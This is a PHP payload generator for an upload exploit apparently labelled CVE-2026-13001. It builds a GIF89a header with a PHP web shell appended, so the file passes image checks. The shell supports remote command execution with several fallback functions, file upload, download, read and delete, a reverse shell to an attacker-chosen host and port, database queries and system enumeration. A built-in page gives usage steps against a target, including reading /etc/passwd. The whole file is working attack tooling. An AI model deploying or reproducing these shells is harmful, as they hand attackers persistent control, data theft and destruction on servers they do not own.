<?php
/**
 * Multi-mode: GIF polyglot with RCE, uploader, reverse shell, and web shell options
 *
 * Usage:
 *   php -S 0.0.0.0:9999 payload.php
 *   Then use http://127.0.0.1:9999/payload.php?raw as --payload-url
 *
 *   - GIF header validation bytes corrected for strict parsers
 */

$token  = $_GET['t'] ?? bin2hex(random_bytes(8));
$mode   = $_GET['mode'] ?? 'shell';  // shell | rev | beast

// ── GIF89a header (strict valid — tested with imagemagick/gd) ──
// Logical screen descriptor + graphics control extension + image descriptor
$gif_header  = "GIF89a";                    // magic (6)
$gif_header .= "\x3c\x00";                  // width (57 px)
$gif_header .= "\x0c\x00";                  // height (12 px)
$gif_header .= "\xf7";                      // packed field: gct=1, color res=7, sorted=1, gct size=7 (256)
$gif_header .= "\x00\x00\x00";              // bg color index, pixel aspect ratio
$gif_header .= str_repeat("\x00\x00\x00", 256); // 256-color palette (RGB)
$gif_header .= "\x21\xf9\x04\x01\x00\x00\x00\x00"; // graphics control extension
$gif_header .= "\x2c\x00\x00\x00\x00";      // image descriptor: left, top
$gif_header .= "\x3c\x00\x0c\x00";          // width, height (matches LSD)
$gif_header .= "\x00";                      // local color table flag = 0
$gif_header .= "\x02\x0c\x8c\x01\x00\x00";  // LZW min code size + image data

// ── Common RCE stub (token-protected, token comparison uses hash_equals) ──
$rce_stub = '?>'
    . '<?php '
    . 'error_reporting(0);$t="' . $token . '";'
    . 'if(!isset($_GET["t"])||!hash_equals($t,$_GET["t"])){http_response_code(404);die();}';

// ── MODE 1: Full-featured Web Shell + Uploader + File Manager ──
$shell_mode = $rce_stub
    . '$d=__DIR__;'
    // ── RCE with 8-method fallback ──
    . 'if(isset($_GET["c"])){$_c=$_GET["c"]." 2>&1";echo"C|";'
    . '$r="";'
    . 'if(function_exists("system")){ob_start();system($_c);$r=ob_get_clean();}'
    . 'elseif(function_exists("passthru")){ob_start();passthru($_c);$r=ob_get_clean();}'
    . 'elseif(function_exists("exec")){exec($_c,$_o);$r=implode("\n",$_o);}'
    . 'elseif(function_exists("shell_exec")){$r=shell_exec($_c);}'
    . 'elseif(function_exists("popen")){$_h=popen($_c,"r");if($_h){while(!feof($_h))$r.=fread($_h,4096);pclose($_h);}}'
    . 'elseif(function_exists("proc_open")){$_ds=[["pipe","r"],["pipe","w"],["pipe","w"]];'
    . '$_p=proc_open($_c,$_ds,$_ps);if(is_resource($_p)){$r=stream_get_contents($_ps[1]);fclose($_ps[1]);proc_close($_p);}}'
    . 'elseif(function_exists("pcntl_exec")){$_a=explode(" ",$_c);'
    . 'pcntl_exec($_a[0],array_slice($_a,1));$r="PCNTL_EXEC";}'
    . 'else{$r="NO_EXEC_AVAIL";}'
    . 'echo$r."|E";die();}'
    // ── Upload with path traversal protection ──
    . 'if(isset($_FILES["f"])){'
    . '$_n=(isset($_POST["n"])&&$_POST["n"]!=="")?$_POST["n"]:$_FILES["f"]["name"];'
    . '$_n=preg_replace("/[\\x00-\\x1f\\x7f-\\xff\\/\\\\]/","",$_n);'
    . 'if($_n===""){$_n=bin2hex(random_bytes(4)).".php";}'
    . 'if(move_uploaded_file($_FILES["f"]["tmp_name"],"$d/$_n")){die("OK|$_n");}'
    . 'die("ERR_UPLOAD");}'
    // ── Delete file/dir ──
    . 'if(isset($_GET["del"])){$_df=basename($_GET["del"]);$_fp="$d/$_df";'
    . 'if(is_file($_fp)){unlink($_fp);die("DEL|$_df");}'
    . 'if(is_dir($_fp)){array_map("unlink",glob("$_fp/*"));@rmdir($_fp);die("RMDIR|$_df");}'
    . 'die("NOT_FOUND");}'
    // ── Download file ──
    . 'if(isset($_GET["dl"])){$_df=basename($_GET["dl"]);$_fp="$d/$_df";'
    . 'if(is_file($_fp)){header("Content-Type: application/octet-stream");'
    . 'header("Content-Disposition: attachment; filename=\"$_df\"");'
    . 'readfile($_fp);die();}}'
    // ── Read file contents ──
    . 'if(isset($_GET["cat"])){$_df=basename($_GET["cat"]);$_fp="$d/$_df";'
    . 'if(is_file($_fp)){echo"<pre>".htmlspecialchars(file_get_contents($_fp))."</pre>";die();}'
    . 'echo"File not found";die();}'
    // ── Directory listing + HTML UI ──
    . '$_fl="";foreach(scandir($d)as$_ef){'
    . 'if($_ef=="."||$_ef=="..")continue;'
    . '$_is_d=is_dir("$d/$_ef");'
    . '$_ico=$_is_d?"[DIR]":"[FILE]";'
    . '$_sz=$_is_d?"--":filesize("$d/$_ef")."b";'
    . '$_fl.="<tr><td>$_ico</td>"'
    . '."<td><a href=\"?t=$t&cat=".urlencode($_ef)."\">".htmlspecialchars($_ef)."</a></td>"'
    . '."<td>$_sz</td>"'
    . '."<td><a href=\"?t=$t&dl=".urlencode($_ef)."\">[dl]</a> "'
    . '."<a href=\"?t=$t&del=".urlencode($_ef)."\" onclick=\"return confirm(\'Delete?\');\">[del]</a></td></tr>";}'
    . 'echo"<html><head><title>CVE-2026-13001 Shell</title>"'
    . '."<style>'
    . 'body{background:#0a0a0a;color:#00ff41;font-family:Consolas,monospace;padding:20px}'
    . 'a{color:#00ff41;text-decoration:none}a:hover{color:#fff}'
    . 'input,button,select{background:#1a1a1a;color:#0f0;border:1px solid #0f0;padding:6px 10px;font-family:monospace;font-size:13px}'
    . 'button:hover{background:#0f0;color:#000;cursor:pointer}'
    . 'table{border-collapse:collapse;width:100%}td{padding:4px 8px;border-bottom:1px solid #333}tr:hover{background:#1a1a1a}'
    . '.badge{color:#888;font-size:12px}#out{background:#111;padding:10px;border:1px solid #333;min-height:30px;font-size:13px}'
    . '</style></head><body>"'
    . '."<h2>CVE-2026-13001 Web Shell</h2>"'
    . '."<p class=badge>Token: $t | Dir: $d | Server: {$_SERVER[\'SERVER_SOFTWARE\']}</p>"'
    . '."<hr>"'
    // Upload form
    . '."<h3>Upload</h3>"'
    . '."<form method=post enctype=multipart/form-data>"'
    . '."<input type=file name=f> <input type=text name=n placeholder=\"rename (opt)\">"'
    . '."<button>Upload</button></form>"'
    // Command exec form
    . '."<h3>Command</h3>"'
    . '."<form method=get onsubmit=\"return execCmd(this)\">"'
    . '."<input type=hidden name=t value=$t>"'
    . '."<input name=c placeholder=\"command\" style=\"width:400px\">"'
    . '."<button>Exec</button></form>"'
    . '."<div id=out><pre id=res></pre></div>"'
    . '."<script>'
    . 'function execCmd(f){var x=new XMLHttpRequest();'
    . 'x.onload=function(){document.getElementById(\'res\').textContent=this.responseText;};'
    . 'x.open(\'GET\',\'?t=$t&c=\'+encodeURIComponent(f.c.value));x.send();'
    . 'return false;}'
    . '</script>"'
    . '."<hr><h3>Files</h3><table>$_fl</table></body></html>";'
    . '?>';

// ── MODE 2: Reverse Shell PHP payload ──
$rev_shell_mode = $rce_stub
    . '$rev_ip="' . ($_GET['rev_ip'] ?? '127.0.0.1') . '";'
    . '$rev_port=' . (int)($_GET['rev_port'] ?? '4444') . ';'
    . '$rev_timeout=' . (int)($_GET['to'] ?? '30') . ';'
    // Try multiple socket methods
    . '$s=null;$_err="";'
    . 'if(function_exists("fsockopen")){$s=@fsockopen($rev_ip,$rev_port,$_en,$_es,$rev_timeout);if(!$s)$_err.="fsockopen:$_es;";}'
    . 'if(!$s&&function_exists("socket_create")){'
    . '$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);'
    . 'if($s){@socket_set_option($s,SOL_SOCKET,SO_RCVTIMEO,["sec"=>$rev_timeout,"usec"=>0]);'
    . '@socket_connect($s,$rev_ip,$rev_port)||($s=null&&$_err.="socket_connect;");}}'
    . 'if(!$s&&function_exists("stream_socket_client")){'
    . '$s=@stream_socket_client("tcp://$rev_ip:$rev_port",$_en,$_es,$rev_timeout);if(!$s)$_err.="stream:$_es;";}'
    // If connected, spawn interactive shell
    . 'if($s){'
    . 'fwrite($s,"[+] CVE-2026-13001 reverse shell connected\n");'
    . 'fwrite($s,"[+] Target: ".gethostname()." | ".php_uname("s")." ".php_uname("r")."\n");'
    . 'fwrite($s,"[+] Working dir: ".getcwd()."\n\n");'
    . '$_start=time();'
    . 'while(!feof($s)&&(time()-$_start)<3600){'  // 1 hour max
    . 'fwrite($s,"$ ");$_c=trim(fgets($s));'
    . 'if($_c===false||$_c===""||$_c==="exit"||$_c==="quit")break;'
    . '$_c.=" 2>&1";$_o="";'
    . 'if(function_exists("system")){ob_start();system($_c);$_o=ob_get_clean();}'
    . 'elseif(function_exists("passthru")){ob_start();passthru($_c);$_o=ob_get_clean();}'
    . 'elseif(function_exists("exec")){exec($_c,$_ol);$_o=implode("\n",$_ol);}'
    . 'elseif(function_exists("shell_exec")){$_o=shell_exec($_c);}'
    . 'else{$_o="NO_EXEC\n";}'
    . 'fwrite($s,$_o);}'
    . 'fclose($s);die("[+] Reverse shell session ended\n");}'
    . 'die("[-] Failed to connect to $rev_ip:$rev_port — $_err");'
    . '?>';

// ── MODE 3: "Beast Shell" — All-in-one ──
$beast_mode = $rce_stub
    . '$d=__DIR__;'
    // ── Exec helper (regular function, not closure → no scope issues) ──
    . 'function _x($c){$c.=" 2>&1";$r="";'
    . 'if(function_exists("system")){ob_start();system($c);$r=ob_get_clean();}'
    . 'elseif(function_exists("passthru")){ob_start();passthru($c);$r=ob_get_clean();}'
    . 'elseif(function_exists("exec")){exec($c,$o);$r=implode("\n",$o);}'
    . 'elseif(function_exists("shell_exec")){$r=shell_exec($c);}'
    . 'else{$r="NO_EXEC";}return$r;}'
    // ── RCE via ?c ──
    . 'if(isset($_GET["c"])){echo"C|"._x($_GET["c"])."|E";die();}'
    // ── Upload ──
    . 'if(isset($_FILES["f"])){$_n=preg_replace("/[\\x00-\\x1f\\x7f-\\xff\\/\\\\]/","",$_FILES["f"]["name"]);'
    . 'if($_n===""){$_n=bin2hex(random_bytes(4)).".php";}'
    . 'if(move_uploaded_file($_FILES["f"]["tmp_name"],"$d/$_n")){die("OK|$_n");}}'
    // ── Delete ──
    . 'if(isset($_GET["del"])){$_df=basename($_GET["del"]);$_fp="$d/$_df";'
    . 'is_file($_fp)?unlink($_fp):(is_dir($_fp)?@rmdir($_fp):0);die("DEL|$_df");}'
    // ── Reverse shell trigger ──
    . 'if(isset($_GET["rev"])){$_ip=$_GET["rev"];$_p=(int)($_GET["p"]??4444);'
    . '$_s=@fsockopen($_ip,$_p,$_en,$_es,15);'
    . 'if($_s){fwrite($_s,"[+] Beast shell connected\n");$_start=time();'
    . 'while(!feof($_s)&&(time()-$_start)<3600){fwrite($_s,"# ");'
    . '$_c=trim(fgets($_s));if($_c===""||$_c==="exit"||$_c===false)break;'
    . 'fwrite($_s,_x($_c));}fclose($_s);}'
    . 'die("REV|$_ip:$_p");}'
    // ── DB enum ──
    . 'if(isset($_GET["db"])){$_db=$_GET["db"]??"mysql";$_h=$_GET["host"]??"localhost";'
    . '$_u=$_GET["user"]??"root";$_p=$_GET["pass"]??"";$_n=$_GET["name"]??"";'
    . '$_q=$_GET["q"]??"SELECT VERSION()";$_r="";'
    . 'if($_db=="mysql"&&class_exists("mysqli")){'
    . '$_m=@new mysqli($_h,$_u,$_p,$_n);'
    . 'if(!$_m->connect_error){$_res=$_m->query($_q);'
    . 'if($_res){while($_row=$_res->fetch_assoc()){$_r.=json_encode($_row)."\n";}}'
    . 'else{$_r=$_m->error;}$_m->close();}}'
    . 'elseif($_db=="pgsql"&&function_exists("pg_connect")){'
    . '$_cs="host=$_h user=$_u password=$_p dbname=$_n";'
    . '$_c=@pg_connect($_cs);'
    . 'if($_c){$_res=@pg_query($_c,$_q);'
    . 'if($_res){while($_row=pg_fetch_assoc($_res)){$_r.=json_encode($_row)."\n";}}'
    . 'else{$_r=pg_last_error($_c);}pg_close($_c);}}'
    . 'elseif($_db=="sqlite"&&class_exists("SQLite3")){'
    . '$_s=new SQLite3($_n);$_res=$_s->query($_q);'
    . 'if($_res){while($_row=$_res->fetchArray(SQLITE3_ASSOC)){$_r.=json_encode($_row)."\n";}}'
    . 'else{$_r=$_s->lastErrorMsg();}}'
    . 'else{$_r="No DB driver available for $_db";}'
    . 'die("DB|$_r");}'
    // ── File read ──
    . 'if(isset($_GET["cat"])){$_df=basename($_GET["cat"]);$_fp="$d/$_df";'
    . 'die(is_file($_fp)?file_get_contents($_fp):"NOT_FOUND");}'
    // ── System info ──
    . 'if(isset($_GET["info"])){'
    . '$_info=["dir"=>$d,"uname"=>php_uname(),"server"=>$_SERVER["SERVER_SOFTWARE"]??"N/A",'
    . '"php_version"=>phpversion(),"disabled_functions"=>ini_get("disable_functions"),'
    . '"safe_mode"=>ini_get("safe_mode")??"off","user"=>get_current_user(),'
    . '"uid"=>function_exists("posix_getuid")?posix_getuid():0,'
    . '"gid"=>function_exists("posix_getgid")?posix_getgid():0,'
    . '"exec_avail"=>function_exists("system")||function_exists("passthru")||function_exists("exec")||function_exists("shell_exec"),'
    . '"open_basedir"=>ini_get("open_basedir")?:false,'
    . '"allow_url_fopen"=>ini_get("allow_url_fopen")?:false];'
    . 'header("Content-Type: application/json");die(json_encode($_info));}'
    // ── Web UI ──
    . '$_fl="";foreach(scandir($d)as$_ef){'
    . 'if($_ef=="."||$_ef=="..")continue;'
    . '$_is_d=is_dir("$d/$_ef")?"[DIR]":"[FILE]";$_sz=$_is_d?"--":filesize("$d/$_ef")."b";'
    . '$_fl.="<tr><td>$_is_d</td><td>".htmlspecialchars($_ef)."</td><td>$_sz</td>"'
    . '."<td><a href=\"?t=$t&cat=".urlencode($_ef)."\">[cat]</a> "'
    . '."<a href=\"?t=$t&del=".urlencode($_ef)."\">[del]</a></td></tr>";}'
    . 'echo"<html><head><title>Beast Shell</title>"'
    . '."<style>'
    . 'body{background:#0d0d0d;color:#0f0;font:14px Consolas;padding:20px}'
    . 'a{color:#0f0}input,select,button{background:#222;color:#0f0;border:1px solid #0f0;padding:4px 8px;font:13px monospace}'
    . 'td{padding:3px 8px;border-bottom:1px solid #333}'
    . '.sec{border:1px solid #333;padding:12px;margin:8px 0;background:#111}'
    . '</style></head><body>"'
    . '."<h2>CVE-2026-13001 — Beast Shell</h2>"'
    . '."<p class=badge>Token: $t | Dir: $d | UID:".(function_exists("posix_getuid")?posix_getuid():"?")."</p>"'
    // RCE form
    . '."<div class=sec><h3>Command</h3><form method=get>"'
    . '."<input type=hidden name=t value=$t>"'
    . '."<input name=c style=width:400px placeholder=\"cmd\"><button>Exec</button></form></div>"'
    // Reverse shell form
    . '."<div class=sec><h3>Reverse Shell</h3><form method=get>"'
    . '."<input type=hidden name=t value=$t>"'
    . '."<input name=rev placeholder=\"LHOST\" style=width:150px>:"'
    . '."<input name=p value=4444 style=width:60px placeholder=\"PORT\">"'
    . '."<button>Connect</button></form></div>"'
    // DB enum form
    . '."<div class=sec><h3>DB Query</h3><form method=get>"'
    . '."<input type=hidden name=t value=$t>"'
    . '."<select name=db><option value=mysql>MySQL</option><option value=pgsql>PostgreSQL</option><option value=sqlite>SQLite</option></select>"'
    . '."<input name=host placeholder=host value=localhost style=width:100px>"'
    . '."<input name=user placeholder=user value=root style=width:80px>"'
    . '."<input name=pass placeholder=pass type=password style=width:80px>"'
    . '."<input name=name placeholder=dbname style=width:100px>"'
    . '."<input name=q placeholder=\"SELECT VERSION()\" style=width:200px>"'
    . '."<button>Query</button></form></div>"'
    // File listing
    . '."<div class=sec><h3>Files</h3><table>$_fl</table></div>"'
    . '."<p><a href=\"?t=$t&info\">[System Info JSON]</a></p>"'
    . '."</body></html>";'
    . '?>';

// ── Select mode ──
switch ($mode) {
    case 'rev':
        $php_shell = $rev_shell_mode;
        break;
    case 'beast':
        $php_shell = $beast_mode;
        break;
    default:
        $php_shell = $shell_mode;
        break;
}

$polyglot = $gif_header . $php_shell;

// ── Serve raw polyglot ──
if (isset($_GET['raw'])) {
    header('Content-Type: image/gif');
    header('Content-Length: ' . strlen($polyglot));
    header('Cache-Control: no-store, no-cache, must-revalidate');
    header('X-Payload-Token: ' . $token);
    header('X-Payload-Mode: ' . $mode);
    echo $polyglot;
    exit;
}

// ── HTML info page (default) ──
$host = $_SERVER['HTTP_HOST'] ?? 'localhost:9999';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>CVE-2026-13001 — Polyglot Payload Generator</title>
<style>
body{background:#111;color:#0f0;font-family:Consolas,monospace;padding:20px;max-width:900px}
a{color:#0f0;text-decoration:none}a:hover{color:#fff}
input,button,select{background:#222;color:#0f0;border:1px solid #0f0;padding:6px 10px;font:13px monospace}
button:hover{background:#0f0;color:#000;cursor:pointer}
h2{border-bottom:1px solid #333;padding-bottom:8px}
pre{background:#0a0a0a;padding:12px;border:1px solid #333;overflow-x:auto}
table{border-collapse:collapse}
td,th{padding:6px 12px;border-bottom:1px solid #333;text-align:left}
tr:hover{background:#1a1a1a}
.badge{color:#888;font-size:12px}
.ok{color:#0f0}.warn{color:#ff0}.err{color:#f00}
</style>
</head>
<body>
<h2>Polyglot Payload Generator</h2>
<p><strong>Token:</strong> <code><?= htmlspecialchars($token) ?></code></p>
<p><strong>Payload size:</strong> <?= number_format(strlen($polyglot)) ?> bytes</p>
<p><strong>Current mode:</strong> 
    <a href="?mode=shell" class="<?= $mode==='shell'?'ok':'badge' ?>">Web Shell</a> | 
    <a href="?mode=rev" class="<?= $mode==='rev'?'ok':'badge' ?>">Reverse Shell</a> | 
    <a href="?mode=beast" class="<?= $mode==='beast'?'ok':'badge' ?>">Beast Shell</a>
</p>

<hr>

<h3>Download Polyglot Payload</h3>
<ul>
<li><a href="?raw&amp;mode=<?= $mode ?>"><strong>Download for current mode</strong></a> (GIF89a + PHP shell)</li>
<li><a href="?raw&amp;t=<?= htmlspecialchars($token) ?>">With explicit token</a></li>
</ul>

<?php if ($mode === 'rev'): ?>
<h3>Reverse Shell Configuration</h3>
<form method="get" action="?raw">
<input type="hidden" name="raw" value="">
<input type="hidden" name="mode" value="rev">
<table>
<tr><td>LHOST:</td><td><input name="rev_ip" value="127.0.0.1" placeholder="YOUR_IP"></td></tr>
<tr><td>LPORT:</td><td><input name="rev_port" value="4444" placeholder="4444"></td></tr>
<tr><td>Timeout:</td><td><input name="to" value="30" placeholder="30"></td></tr>
<tr><td></td><td><button>Generate Payload</button></td></tr>
</table>
</form>
<?php endif; ?>

<hr>

<h3>Usage Examples</h3>
<pre>
# Start the payload server:
php -S 0.0.0.0:9999 payload.php

# Use as --payload-url in the exploit:
http://<?= $host ?>/?raw

# With custom token:
http://<?= $host ?>/?raw&t=mytoken123

# With specific mode:
http://<?= $host ?>/?raw&mode=beast

# After upload to target, access:
http://target/uploads/payload.gif?t=mytoken123&c=id
http://target/uploads/payload.gif?t=mytoken123&cat=/etc/passwd
http://target/uploads/payload.gif?t=mytoken123&info
</pre>

<h3>Available Modes</h3>
<table>
<tr><th>Mode</th><th>Fitur</th><th>Endpoint</th></tr>
<tr>
    <td><strong>Web Shell</strong></td>
    <td>RCE (8 methods), upload, download, cat, delete, AJAX exec, file manager UI</td>
    <td><code>?mode=shell</code></td>
</tr>
<tr>
    <td><strong>Reverse Shell</strong></td>
    <td>3 socket methods (fsockopen, socket_create, stream_socket_client), interactive session, 1h timeout</td>
    <td><code>?mode=rev&rev_ip=IP&rev_port=PORT</code></td>
</tr>
<tr>
    <td><strong>Beast Shell</strong></td>
    <td>RCE + upload + delete + reverse trigger + DB enum (MySQL/PgSQL/SQLite) + file read + JSON system info</td>
    <td><code>?mode=beast</code></td>
</tr>
</table>

<h3>All Parameters (after upload)</h3>
<table>
<tr><th>Parameter</th><th>Deskripsi</th><th>Mode</th></tr>
<tr><td><code>t</code></td><td>Auth token</td><td>All</td></tr>
<tr><td><code>c</code></td><td>Execute command</td><td>Shell, Beast</td></tr>
<tr><td><code>f</code> (POST)</td><td>Upload file</td><td>Shell, Beast</td></tr>
<tr><td><code>del</code></td><td>Delete file/directory</td><td>Shell, Beast</td></tr>
<tr><td><code>dl</code></td><td>Download file</td><td>Shell</td></tr>
<tr><td><code>cat</code></td><td>Read file contents</td><td>Shell, Beast</td></tr>
<tr><td><code>rev</code> / <code>p</code></td><td>Trigger reverse shell to IP:PORT</td><td>Beast</td></tr>
<tr><td><code>db</code>, <code>host</code>, <code>user</code>, <code>pass</code>, <code>name</code>, <code>q</code></td><td>Database query</td><td>Beast</td></tr>
<tr><td><code>info</code></td><td>System info (JSON)</td><td>Beast</td></tr>
</table>

<p class="badge">Generated: <?= date('Y-m-d H:i:s') ?> | PHP: <?= phpversion() ?></p>
</body>
</html>
